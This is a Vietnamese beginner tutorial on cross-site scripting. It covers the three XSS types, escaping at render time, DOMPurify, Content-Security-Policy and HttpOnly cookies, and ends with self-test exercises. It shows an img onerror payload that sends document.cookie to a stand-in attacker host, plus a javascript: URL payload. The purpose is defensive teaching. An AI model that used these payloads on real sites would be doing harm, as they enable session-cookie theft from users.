---
title: XSS — Cross-Site Scripting
slug: xss-cross-site-scripting
summary: Chèn JavaScript vào trang của người khác — ba loại XSS và các lớp phòng thủ tương ứng.
level: co-ban
tags: [owasp, xss, frontend]
khung: v2
---

> **Sau bài này bạn sẽ:** hiểu vì sao escape phải làm **lúc render** chứ không phải lúc lưu, và biết ba lớp phòng thủ xếp chồng lên nhau.

## Ý tưởng chính

XSS là injection ở phía trình duyệt: **dữ liệu của người dùng bị hiểu thành HTML/JavaScript** thay vì thành văn bản.

Hậu quả không phải "hiện popup" như ví dụ hay thấy. Script chạy **trong ngữ cảnh trang của bạn**, nên nó làm được mọi thứ người dùng làm được: đọc cookie, gọi API với phiên của họ, đổi mật khẩu, chuyển tiền.

## Mental model

Hãy nghĩ tới **bảng tin của toà nhà**.

> Ai cũng dán giấy lên bảng tin được. Bình thường mọi người dán thông báo — và người đọc đọc chúng như **văn bản**.
>
> Rồi một người dán tờ giấy ghi: *"Thông báo của ban quản lý: vui lòng đưa chìa khoá cho người mặc áo xanh."*
>
> Tờ giấy đó **trông giống hệt thông báo chính thức**, vì bảng tin không phân biệt được ai dán. Người đọc tin nó — vì nó ở trên bảng tin của toà nhà.

XSS cũng vậy: script của kẻ tấn công chạy **trên tên miền của bạn**, nên trình duyệt tin nó hoàn toàn.

## Ví dụ nhỏ

```html
<!-- Người dùng đặt tên hiển thị là: -->
<img src=x onerror="fetch('https://ke-tan-cong.com?c='+document.cookie)">
```

```jsx
// ❌ Render thẳng
<div dangerouslySetInnerHTML={{ __html: user.ten }} />

// ✅ Render như văn bản — React tự escape
<div>{user.ten}</div>
```

## Code chạy thế nào

**Escape phải làm lúc RENDER, không phải lúc LƯU** — đây là điểm nhiều người làm ngược:

```text
❌ Escape lúc lưu
   Lưu vào CSDL:  &lt;b&gt;An&lt;/b&gt;
   ⇒ Dữ liệu bị bẩn vĩnh viễn
   ⇒ Xuất ra JSON cho app di động: hiện "&lt;b&gt;An&lt;/b&gt;"
   ⇒ Xuất ra PDF, email, CSV: cùng vấn đề
   ⇒ Escape hai lần: hiện "&amp;lt;b&amp;gt;"

✅ Escape lúc render
   Lưu nguyên văn:  <b>An</b>
   ⇒ Render HTML   → escape thành &lt;b&gt;
   ⇒ Render JSON   → không escape HTML, escape theo quy tắc JSON
   ⇒ Render CSV    → escape theo quy tắc CSV
```

Lý do: **cách escape phụ thuộc vào nơi dữ liệu đi ra**. Escape lúc lưu là quyết định sớm cho một ngữ cảnh mà bạn chưa biết.

Và **ngữ cảnh trong HTML cũng khác nhau**:

```html
<div>{{ x }}</div>                      <!-- ngữ cảnh: nội dung HTML -->
<a href="{{ x }}">                      <!-- ngữ cảnh: URL — javascript: vẫn chạy! -->
<div onclick="{{ x }}">                 <!-- ngữ cảnh: JavaScript -->
<div style="color: {{ x }}">            <!-- ngữ cảnh: CSS -->
```

```jsx
// ❌ React KHÔNG bảo vệ bạn ở đây
<a href={user.website}>Website</a>
// user.website = "javascript:alert(document.cookie)"
```

```ts
// ✅ Kiểm giao thức
const an = /^https?:\/\//.test(url) ? url : '#'
```

Đây là chỗ người dùng React hay bất ngờ: React escape **nội dung**, nhưng không kiểm **giao thức của URL**.

## Cú pháp

**Ba loại XSS:**

```text
① STORED (lưu trữ)   — script được LƯU vào CSDL, phát tán cho mọi người xem
                       ⇒ nguy hiểm nhất: một lần chèn, hàng nghìn nạn nhân
                       ví dụ: bình luận, tên hiển thị, mô tả sản phẩm

② REFLECTED (phản chiếu) — script nằm trong URL, phản chiếu lại trong phản hồi
                       ⇒ cần lừa nạn nhân bấm vào link
                       ví dụ: trang kết quả tìm kiếm hiện lại từ khoá

③ DOM-based          — không qua server; JavaScript phía client tự chèn
                       ⇒ ví dụ: element.innerHTML = location.hash
```

Loại ③ đáng chú ý vì nó **không xuất hiện trong log server** — bạn không thấy dấu vết gì cả.

**Khi phải cho phép HTML** (trình soạn thảo rich text):

```ts
import DOMPurify from 'isomorphic-dompurify'

const an = DOMPurify.sanitize(noiDungThoTuNguoiDung, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
  ALLOWED_ATTR: ['href'],
})
```

Đừng tự viết bộ lọc HTML. Có hàng trăm cách vượt qua bộ lọc tự viết, và người ta đã dành nhiều năm để tìm ra chúng.

## Tại sao cần nó

Vì escape là **lớp một**, và bạn cần thêm hai lớp nữa — vì lớp một sẽ có lúc bị bỏ sót:

**Lớp 2 — Content Security Policy:**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'; base-uri 'self'
```

```text
CSP nói với trình duyệt: "chỉ chạy script từ những nguồn này".
⇒ Kể cả khi kẻ tấn công chèn được <script>, trình duyệt TỪ CHỐI chạy nó.
```

Điểm quan trọng: `'unsafe-inline'` làm CSP gần như vô dụng cho việc chống XSS. Dùng **nonce** hoặc **hash** cho script inline.

**Lớp 3 — cookie an toàn:**

```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Path=/
```

```text
HttpOnly  → JavaScript KHÔNG đọc được cookie
          ⇒ kể cả khi XSS xảy ra, phiên đăng nhập không bị đánh cắp
Secure    → chỉ gửi qua HTTPS
SameSite  → chống CSRF ([[csrf-va-clickjacking]])
```

`HttpOnly` là một dòng cấu hình, và nó biến một lỗ hổng XSS từ *"mất tài khoản"* thành *"khó chịu"*. Đây là ví dụ rõ nhất của phòng thủ nhiều lớp.

## So sánh

| Nơi dữ liệu đi ra | Cách escape |
|---|---|
| Nội dung HTML | `&lt; &gt; &amp;` — React/Vue tự làm |
| Thuộc tính HTML | Escape + luôn bọc dấu nháy |
| URL trong `href`/`src` | Kiểm **giao thức**, chỉ cho `http/https` |
| Trong `<script>` | JSON encode, và tránh chèn dữ liệu vào script |
| CSS | Gần như không nên chèn dữ liệu người dùng vào CSS |

## Dễ nhầm

**1. `dangerouslySetInnerHTML` với dữ liệu người dùng.** Tên hàm đã cảnh báo rồi.

**2. Escape lúc lưu.** Dữ liệu bẩn vĩnh viễn, và sai ở mọi ngữ cảnh khác.

**3. Tin rằng framework bảo vệ mọi chỗ.** React escape nội dung, **không** kiểm URL, và `dangerouslySetInnerHTML` thì bỏ qua hoàn toàn.

**4. Tự viết bộ lọc HTML.** Dùng DOMPurify.

**5. CSP có `'unsafe-inline'`.** Gần như vô dụng cho việc chống XSS.

**6. Quên `HttpOnly`.** Lưu token trong `localStorage` cũng cùng vấn đề: JavaScript đọc được, nên XSS đọc được.

**7. Chỉ nghĩ tới XSS ở form nhập liệu.** Nó cũng đến từ tên file tải lên, dữ liệu import CSV, phản hồi API bên thứ ba, và tham số URL.

**8. Quên loại DOM-based.** Không có dấu vết trong log server.

## Mẹo nhớ

> **Bảng tin toà nhà: người đọc tin tờ giấy vì nó ở trên bảng tin CỦA BẠN.**
>
> **Escape lúc RENDER, không phải lúc LƯU — vì cách escape phụ thuộc nơi dữ liệu đi ra.**
>
> **Ba lớp: escape · CSP · HttpOnly.**

## Tự nhớ

Không nhìn lên, trả lời bằng lời của bạn:

1. Vì sao XSS nguy hiểm hơn "hiện một popup"?
2. Vì sao escape lúc lưu là sai — nêu hai hậu quả?
3. React bảo vệ bạn ở đâu, và **không** bảo vệ ở đâu?
4. CSP hoạt động thế nào, và `'unsafe-inline'` phá hỏng nó ra sao?
5. `HttpOnly` biến hậu quả của XSS từ gì thành gì?

## Tự viết lại

Không nhìn lại phần trên, tìm và sửa các lỗ hổng XSS:

```jsx
function HoSo({ user }) {
  return (
    <div>
      <h1 dangerouslySetInnerHTML={{ __html: user.ten }} />
      <a href={user.website}>Website</a>
      <img src={user.avatar} onError={`bao('${user.ten}')`} />
    </div>
  )
}
```

Tự kiểm: bạn tìm ra **ba** chỗ chứ? Và với `user.ten` cần in đậm một phần, bạn xử lý thế nào?

## Thử sức

Ứng dụng của bạn cho người dùng viết bình luận có định dạng (đậm, nghiêng, link). Bạn dùng DOMPurify và đặt CSP chặt chẽ.

Một hôm có người báo: bấm vào link trong bình luận của họ thì bị chuyển tới trang lừa đảo — **dù DOMPurify vẫn chạy**.

Chẩn đoán: DOMPurify cho phép thẻ `<a>` và thuộc tính `href`. Lỗ hổng nằm ở đâu, và bạn cấu hình lại thế nào? Câu khó: ngoài chặn, bạn **hiển thị** link ngoài ra sao để người dùng biết mình sắp rời khỏi trang?
